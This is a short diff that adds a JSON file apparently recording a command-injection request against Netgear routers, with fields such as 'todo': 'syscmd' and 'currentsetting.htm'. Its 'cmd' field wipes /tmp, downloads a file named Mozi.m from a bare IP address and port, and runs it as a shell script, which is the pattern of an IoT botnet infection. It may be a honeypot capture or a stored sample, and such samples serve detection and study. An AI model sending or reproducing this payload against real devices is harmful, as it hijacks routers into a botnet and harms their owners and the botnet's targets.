@@ -1,0 +1,7 @@
+{
+    "next_file": "netgear.cfg",
+    "todo": "syscmd",
+    "cmd": "rm+-rf+/tmp/*;wget+http://182.127.181.111:37790/Mozi.m+-O+/tmp/netgear;sh+netgear",
+    "curpath": "/",
+    "currentsetting.htm": "1"
+}
